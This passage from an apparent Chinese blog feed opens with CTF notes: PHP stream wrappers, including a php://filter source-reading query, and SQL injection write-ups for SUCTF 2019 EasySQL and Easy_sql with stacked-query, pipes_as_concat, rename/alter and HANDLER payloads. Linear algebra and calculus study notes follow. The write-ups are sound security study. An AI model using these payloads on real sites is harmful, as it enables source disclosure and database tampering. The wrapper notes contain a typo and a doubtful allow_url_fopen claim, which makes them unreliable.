&lt;h3 id=&#34;php伪协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php伪协议&#34;&gt;#&lt;/a&gt; PHP 伪协议&lt;/h3&gt;
&lt;p&gt;需要开启 allow_url_fopen 的: php://stdin、php://memory、php://temp&lt;/p&gt;
&lt;p&gt;不需要开启 allow_wrl_fopen 的：php://filter&lt;/p&gt;
&lt;p&gt;在 CTF 中常用的 php://filter&lt;/p&gt;
&lt;p&gt;php://filter 用于读取源码，php://input 用于执行 php 代码&lt;br /&gt;
 php://input 需要 post 提交数据&lt;br /&gt;
 php://filter 可以提交？a=php://filter/read=convert.base64-encode/resource=xxx.php&lt;/p&gt;
&lt;p&gt;url 中？代表传值的意思，id 代表变量，后面的 &amp;quot;=&amp;quot; 代表变量的值&lt;/p&gt;
&lt;h3 id=&#34;suctf-2019easysql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#suctf-2019easysql&#34;&gt;#&lt;/a&gt; [SUCTF 2019]EasySQL&lt;/h3&gt;
&lt;p&gt;一道 sql 注入的题目，题目原意是堆叠注入或该换 || 的用处。然而 wp 中却给出了一种短路处理的办法。&lt;/p&gt;
&lt;p&gt;我们来细究一下它的原理。》》&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&#34;直接注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#直接注&#34;&gt;#&lt;/a&gt; 直接注&lt;/h4&gt;
&lt;p&gt;首先吗看题&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/easysql1.jpg&#34; alt=&#34;easysql1&#34; /&gt;&lt;/p&gt;
&lt;p&gt;然后寻找注入点，先试试 &lt;code&gt;&#39;,&amp;quot;,&#39;),&amp;quot;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后回显不是 “无” 就是 Nonono.&lt;/p&gt;
&lt;p&gt;在用字符，和整数试试。发现字符时无回显，整数时有！！&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/easysql2.jpg&#34; alt=&#34;easysql2&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这是一个表结构！！&lt;/p&gt;
&lt;p&gt;再审题，发现他说” 查询 “？怀疑这是个内嵌的后端查询，就是说它的&lt;strong&gt;源码&lt;/strong&gt;可能是&lt;/p&gt;
&lt;p&gt;&lt;code&gt; select $_POST[&#39;query&#39;] from xxx&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;越来越靠近真相了！！&lt;/p&gt;
&lt;p&gt;所以它应该是对 &lt;code&gt;&#39;,&amp;quot;,&#39;),&amp;quot;)&lt;/code&gt;  报错了所以什么都不回显或者是过滤，再试试 database () 发现没有用？？&lt;/p&gt;
&lt;p&gt;上面能回显整数却不回显字符 (a,b,c...)，em... 有问题。&lt;/p&gt;
&lt;p&gt;回想上一张输入整数的图，他回显了个 &lt;code&gt;Array (    [0] =&amp;gt; 1 )&lt;/code&gt; ,en... 它从 xxx 这个表中返回了 1 条数据，说明这个数据表 xxx 中只有一条数据，si~~。&lt;/p&gt;
&lt;p&gt;继续，结合题目&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Give me your flag, I will tell you if the flag is right.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;flag？is right？  很可能这条数据就是 flag！！！&lt;/p&gt;
&lt;p&gt;说明这个源码查询的就是 flag！但查不出来为什么？再思考。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt; select 1 from xxx&lt;/code&gt;  得到的结果就是，一堆 1，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;但是题目输入整数时它也得到 1.&lt;/p&gt;
&lt;p&gt;所以在 $_POST [&#39;query&#39;] 这块肯定有玄机，2 xxx =&amp;gt; 1??&lt;/p&gt;
&lt;p&gt;难道是 || 语法？&lt;/p&gt;
&lt;p&gt;再回想源码，（&lt;em&gt;&lt;strong&gt;&lt;s&gt;结合上面的分析，不妨把表记作 Flag，表中字段为 fffff，字段内容为我们要的 flag）&lt;/s&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; $_POST&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;query&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Flag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;所以应该是，&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; $_POST&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;query&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;flag &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Flag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;flag 本身是假的，不然早注成了！！&lt;/p&gt;
&lt;p&gt;所以直接构造 &lt;code&gt; *,1&lt;/code&gt;  (联系到 select 查询多个的语法)&lt;/p&gt;
&lt;p&gt;然后破案了。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/easysql_end.jpg&#34; alt=&#34;easysql_end&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&#34;堆叠&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#堆叠&#34;&gt;#&lt;/a&gt; 堆叠&lt;/h4&gt;
&lt;p&gt;本题也可用堆叠注入。&lt;/p&gt;
&lt;p&gt;先上 payload:&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; sql_mode&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;pipes_as_concat&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;(前面一个 1 隔断前置 select 后面一个 1？)&lt;br /&gt;
 你直接看这英语意思：&lt;/p&gt;
&lt;p&gt;pipes_as_concat&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;就是把 || 设置成了 concat 函数呗。。。&lt;/strong&gt;&lt;br /&gt;
这也是&lt;strong&gt;猜出了后端代码&lt;/strong&gt;的。&lt;/p&gt;
&lt;p&gt;但是要注意 &amp;lt;u&amp;gt; 分号隔断了前面的命令 &amp;lt;/u&amp;gt;(堆叠注入)，所以要再次添加 select!!&lt;/p&gt;
&lt;p&gt;上面那句执行是：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Flag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;搞定。&lt;/p&gt;
&lt;h3 id=&#34;easy_sql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#easy_sql&#34;&gt;#&lt;/a&gt; Easy_sql&lt;/h3&gt;
&lt;p&gt;有报错但发现 union select 被过滤了，&lt;/p&gt;
&lt;p&gt;where 也被过滤了，但可以堆叠。&lt;/p&gt;
&lt;p&gt;所以使用了 show tables 查表，show columns from ’table‘ 查字段&lt;/p&gt;
&lt;p&gt;找到了 flag 字段，问题在于如何查询 flag？这里给出了两种解法。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;当我们输入 1 时回显数据，并发现当输入 &#39; 时报错，联系题目提示的查询，这里的源代码应该时和 select 有关。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;使用更改表名和字段名的方法使其默认查询的表字段变为 flag 的。&lt;/p&gt;
&lt;p&gt;payload 为&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;rename&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;words&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;words1&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;rename&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;1919810931114514&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;words&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;alter&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;words&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; change &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;id&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;使用了 rename，和 alter，进行修改。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用 mysql 所支持的另一种查询语句。&lt;/p&gt;
&lt;p&gt;payload 为&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;handler&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;1919810931114514&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;handler&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;1919810931114514&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;read&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;first&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;这里需要注意，在之前是先验证了它有回显，有报错，有堆叠！！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;相关资料： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0plc3NlWW91bmcvYXJ0aWNsZS9kZXRhaWxzLzQwNzg1MTM3P2RlcHRoXzEtdXRtX3NvdXJjZT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLUJsb2dDb21tZW5kRnJvbUJhaWR1LTEmYW1wO3V0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy1CbG9nQ29tbWVuZEZyb21CYWlkdS0x&#34;&gt;handler 语法&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/easy_sql.jpg&#34; alt=&#34;easy_sql&#34; /&gt;&lt;/p&gt;
</content>
        <category term="网络安全" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" />
        <category term="CTF" scheme="http://example.com/tags/CTF/" />
        <updated>2022-09-21T14:52:24.722Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2022/09/21/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%94%E8%AE%B0%E4%B8%80/</id>
        <title>线性代数笔记一</title>
        <link rel="alternate" href="http://example.com/2022/09/21/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
        <content type="html">&lt;h1 id=&#34;线性代数笔记一&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#线性代数笔记一&#34;&gt;#&lt;/a&gt; 线性代数笔记一&lt;/h1&gt;
&lt;h2 id=&#34;第一章-线性方程组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一章-线性方程组&#34;&gt;#&lt;/a&gt; 第一章 线性方程组&lt;/h2&gt;
&lt;h3 id=&#34;数域及n元向量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数域及n元向量&#34;&gt;#&lt;/a&gt; 数域及 N 元向量&lt;/h3&gt;
&lt;h4 id=&#34;数域的一些相关&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数域的一些相关&#34;&gt;#&lt;/a&gt; 数域的一些相关&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;设 P 是由一些数组成的集合，&lt;strong&gt;&amp;lt;u&amp;gt; 其中包括 0 与 1&amp;lt;/u&amp;gt;&lt;/strong&gt;，如果 P 中任意两个数的&lt;em&gt;&lt;strong&gt;和、差、积、商&lt;/strong&gt;&lt;/em&gt;（除数不为 0）仍是 P 中的数，则称 P 为一个数域。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;常见数域&lt;/strong&gt;： 复数域&lt;strong&gt; C&lt;/strong&gt;；实数域&lt;strong&gt; R&lt;/strong&gt;；有理数域&lt;strong&gt; Q&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;（注意：自然数集 N 及整数集 Z 都不是数域。）&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;说明：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;若数集 P 中任意两个数作某一运算的结果仍在 P 中，则说数集 P 对这个运算是封闭的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;数域的等价定义&lt;/strong&gt;：如果一个包含 0，1 在内的数集 P 对于加法，减法，乘法与除法（除数不为 0）是封闭的，则称数集 P 为一个数域。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;逆元、单位元&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;逆元&lt;/strong&gt;：在集合中定义某种运算 f (x)，元素与其逆元进行 f (x) 运算得到该运算单位元。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;加法逆元：即相反数，元素与其加法逆元之和为加法单位元 0。&lt;/li&gt;
&lt;li&gt;乘法逆元：即倒数，元素与其乘法逆元之积为乘法单位元 1。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;单位元&lt;/strong&gt;：当它和其他元素结合时，并不会改变那些元素。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;加法单位元 0，n+o=n;&lt;/li&gt;
&lt;li&gt;乘法单位元 1，n*1=n;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&amp;lt;u&amp;gt;&lt;strong&gt; 由数域的定义知数域中一定含有加法逆元乘法逆元，加法单位元乘法单位元。&lt;/strong&gt;&amp;lt;/u&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;集合与向量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#集合与向量&#34;&gt;#&lt;/a&gt; 集合与向量&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;笛卡尔积&lt;/li&gt;
&lt;li&gt;多元有序数组&lt;/li&gt;
&lt;li&gt;坐标系
&lt;ul&gt;
&lt;li&gt;多元有序数组是 N 维空间与笛卡尔积的集合的映射。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;列向量与横向量&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;矩阵初识&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#矩阵初识&#34;&gt;#&lt;/a&gt; 矩阵初识&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/02_1.png&#34; alt=&#34;02-1&#34; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;元素是&lt;strong&gt;实数&lt;/strong&gt;的矩阵称为&lt;strong&gt;实矩阵&lt;/strong&gt;，元素是&lt;strong&gt;复数&lt;/strong&gt;的矩阵称为&lt;strong&gt;复矩阵&lt;/strong&gt;。而&lt;strong&gt;行数与列数都等于 n&lt;/strong&gt; 的矩阵称为&lt;strong&gt; n 阶矩阵&lt;/strong&gt;或&lt;strong&gt; n 阶方阵&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;​&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;初等变换&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;单位阵（diag）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;矩阵相等必须先是同型矩阵&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;同型矩阵才能做加减&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;行阶梯矩阵，行简化形阶梯矩阵&lt;/p&gt;
&lt;p&gt;每个矩阵都与唯一一个行简化阶梯矩阵对应（行阶梯矩阵不唯一，行简化阶梯矩阵唯一）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;矩阵的秩&lt;/p&gt;
&lt;p&gt;设非零矩阵&lt;em&gt;&lt;strong&gt; A&lt;/strong&gt;&lt;/em&gt; 经过初等行变化化为行阶梯形矩阵&lt;em&gt;&lt;strong&gt; R&lt;/strong&gt;&lt;/em&gt;，&lt;em&gt;&lt;strong&gt;R&lt;/strong&gt;&lt;/em&gt; 中非零行的个数称为矩阵&lt;em&gt;&lt;strong&gt; A&lt;/strong&gt;&lt;/em&gt; 的秩，记作 rank&lt;em&gt;&lt;strong&gt;A&lt;/strong&gt;&lt;/em&gt;，或者 r (&lt;em&gt;&lt;strong&gt;A&lt;/strong&gt;&lt;/em&gt;)。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;线性方程组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#线性方程组&#34;&gt;#&lt;/a&gt; 线性方程组&lt;/h3&gt;
&lt;h4 id=&#34;有解判别定理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#有解判别定理&#34;&gt;#&lt;/a&gt; 有解判别定理&lt;/h4&gt;
&lt;p&gt;线性方程组根据解的判定定理判定为：r（A）=r（A|b）&lt;/p&gt;
&lt;p&gt;秩要相等。（在做题时要给出判定）&lt;/p&gt;
&lt;h4 id=&#34;同解方程组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#同解方程组&#34;&gt;#&lt;/a&gt; 同解方程组&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;反身性&lt;/li&gt;
&lt;li&gt;对称性&lt;/li&gt;
&lt;li&gt;传递性&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;消元步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#消元步骤&#34;&gt;#&lt;/a&gt; 消元步骤&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;特解&lt;/p&gt;
&lt;p&gt;增广矩阵化简到行简化阶梯矩阵&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通解&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;第二章-行列式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第二章-行列式&#34;&gt;#&lt;/a&gt; 第二章 行列式&lt;/h2&gt;
&lt;h3 id=&#34;行列式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#行列式&#34;&gt;#&lt;/a&gt; 行列式&lt;/h3&gt;
&lt;h3 id=&#34;计算&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#计算&#34;&gt;#&lt;/a&gt; 计算&lt;/h3&gt;
&lt;h3 id=&#34;展开&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#展开&#34;&gt;#&lt;/a&gt; 展开&lt;/h3&gt;
</content>
        <category term="Mathematics" scheme="http://example.com/categories/Mathematics/" />
        <updated>2022-09-21T10:07:39.589Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2022/09/20/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0%E4%BA%8C/</id>
        <title>数学笔记二</title>
        <link rel="alternate" href="http://example.com/2022/09/20/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
        <content type="html">&lt;h1 id=&#34;数学笔记二&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数学笔记二&#34;&gt;#&lt;/a&gt; 数学笔记・二&lt;/h1&gt;
&lt;h3 id=&#34;第四节-函数的连续性承第一章函数与极限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第四节-函数的连续性承第一章函数与极限&#34;&gt;#&lt;/a&gt; 第四节 函数的连续性（承第一章函数与极限）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;连续性概念&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;由极限的性质可知，一个函数在某点连续的充要条件是它在该点左右都连续。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;间断点分类&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;第一类间断点&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlOEYlQUYlRTUlOEUlQkIlRTklOTclQjQlRTYlOTYlQUQlRTclODIlQjk/ZnJvbU1vZHVsZT1sZW1tYV9pbmxpbms=&#34;&gt;可去间断点&lt;/span&gt;&lt;/strong&gt;：函数在该点左极限、右极限存在且相等，但不等于该点函数值或函数在该点无定义。如函数 y=（x^2-1)/(x-1) 在点 x=1 处。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTglQjclQjMlRTglQjclODMlRTklOTclQjQlRTYlOTYlQUQlRTclODIlQjk/ZnJvbU1vZHVsZT1sZW1tYV9pbmxpbms=&#34;&gt;跳跃间断点&lt;/span&gt;&lt;/strong&gt;：函数在该点左极限、右极限存在，但不相等。如函数 y=|x|/x 在点 x=0 处。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;第二类间断点&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://baike.baidu.com/item/%E6%97%A0%E7%A9%B7%E9%97%B4%E6%96%AD%E7%82%B9/3531630?fromModule=lemma_inlink&#34;&gt;&lt;strong&gt;无穷间断点&lt;/strong&gt;&lt;/a&gt;：函数在该点可以无定义，且左极限、右极限至少有一个不存在，且函数在该点极限为∞。如函数 y=tanx 在点 x=π/2 处。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlOEMlQUYlRTglOEQlQTElRTklOTclQjQlRTYlOTYlQUQlRTclODIlQjk/ZnJvbU1vZHVsZT1sZW1tYV9pbmxpbms=&#34;&gt;振荡间断点&lt;/span&gt;&lt;/strong&gt;：函数在该点可以无定义，当自变量趋于该点时，函数值在两个常数间变动无限多次。如函数 y=sin (1/x) 在 x=0 处。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;由上述对各种间断点的描述可知，&lt;strong&gt;函数 f (x) 在第一类间断点的左右极限都存在，而函数 f (x) 在第二类间断点的左右极限至少有一个不存在&lt;/strong&gt;，这也是第一类间断点和第二类间断点的本质上的区别。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;第五节&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第五节&#34;&gt;#&lt;/a&gt; 第五节&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;迫敛准则&lt;/p&gt;
&lt;p&gt;主要是放缩，抓住可合成量（如 N 个 1 求和为 n*(n+1)/2），和高阶量不变原则&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
